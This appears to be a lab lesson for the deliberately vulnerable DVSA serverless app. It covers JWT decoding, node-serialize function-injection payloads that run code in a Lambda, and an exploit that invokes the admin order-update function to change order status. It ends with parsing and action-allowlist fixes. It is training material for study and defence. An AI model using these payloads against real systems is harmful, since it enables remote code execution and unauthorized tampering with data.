# Lesson 5 folder file

**Filename:** `Lesson 5 Code.md`

```markdown
# Lesson 5 – Broken Access Control Code

## Environment Variables

```bash
export API="<API_URL>"
export TOKEN_B="<TOKEN_B>"
export ORDER_B="<ORDER_ID>"


## Decode the JWT Token

python3 - <<'PY'
import os, json, base64, time
t = os.environ["TOKEN_B"]
p = t.split(".")[1]
p += "=" * (-len(p) % 4)
d = json.loads(base64.urlsafe_b64decode(p.encode()))
print("sub     :", d.get("sub"))
print("username:", d.get("username"))
print("exp     :", d.get("exp"))
print("now     :", int(time.time()))
print("expired?:", int(time.time()) > d["exp"])
PY


## Verify Normal Behavior

curl -sS -X POST "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw '{"action":"orders"}' \
  -w '\nHTTP_CODE=%{http_code}\n'


## Test Payload Execution
curl -sS -X POST "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw '{"action":"_$$ND_FUNC$$_function(){console.error(\"PATCH_TEST_123\");}()","cart-id":""}' \
  -w '\nHTTP_CODE=%{http_code}\n'


## Add aws-sdk@2 to the Lambda Package
mkdir -p ~/dvsa-order-manager
cd ~/dvsa-order-manager
unzip /path/to/DVSA-ORDER-MANAGER.zip

export PATH=/usr/bin:/bin:$PATH
hash -r

npm install aws-sdk@2
zip -r ~/dvsa-order-manager-with-awssdk.zip .


## Verify aws-sdk Loaded

curl -sS -X POST "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw '{"action":"_$$ND_FUNC$$_function(){try{var a=require(\"aws-sdk\");console.error(\"STEP_OK_3\");}catch(e){console.error(\"STEP_ERR_3:\"+e.message);} }()","cart-id":""}' \
  -w '\nHTTP_CODE=%{http_code}\n'


## Create the Exploit Payload File
nano

{
  "action": "_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p={FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:JSON.stringify({\"headers\":{\"authorization\":\"__TOKEN__\"},\"body\":{\"action\":\"update\",\"order-id\":\"__ORDER_ID__\",\"item\":{\"userId\":\"__USER_ID__\",\"token\":\"lesson5token\",\"ts\":__TS__,\"itemList\":{\"1014\":1},\"address\":{\"name\":\"attacker\",\"email\":\"attacker@example.com\",\"address\":\"lab address\"},\"total\":25,\"status\":120}}})};lambda.invoke(p,function(e,d){console.error(\"LESSON5_RESULT:\"+JSON.stringify({error:e,payload:d&&d.Payload}));});}()",
  "cart-id": ""
}

nano ~/lesson5_body.json


## Replace the values of:

TOKEN    = <TOKEN_B>
ORDER ID = <ORDER_B>
USER ID  = <USER_ID>
TS       = output of: date +%s in ubuntu terminal


## Check the Payload File

cat ~/lesson5_body.json


## Send the Exploit Payload

curl -sS -X POST "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-binary @/home/user-m/lesson5_body.json \
  -w '\nHTTP_CODE=%{http_code}\n'


## Fix – Safe Parsing (change req and header to the code below)
let req;
let headers;

try {
    req = typeof event.body === "string" ? JSON.parse(event.body) : event.body;
    headers = typeof event.headers === "string"
      ? JSON.parse(event.headers)
      : (event.headers || {});
} catch (e) {
    return callback(null, {
        statusCode: 400,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ status: "err", msg: "invalid json" })
    });
}


## Fix – Action Allowlist (place before the switch)
const allowedActions = new Set([
    "new",
    "update",
    "cancel",
    "get",
    "orders",
    "account",
    "profile",
    "shipping",
    "billing",
    "complete",
    "inbox",
    "message",
    "delete",
    "upload",
    "feedback",
    "admin-orders"
]);

if (!req || typeof action !== "string" || !allowedActions.has(action)) {
    return callback(null, {
        statusCode: 400,
        headers: {
            "Access-Control-Allow-Origin" : "*"
        },
        body: JSON.stringify({ "status": "err", "msg": "unknown action" })
    });
}


## Verify the fix by testing previous code
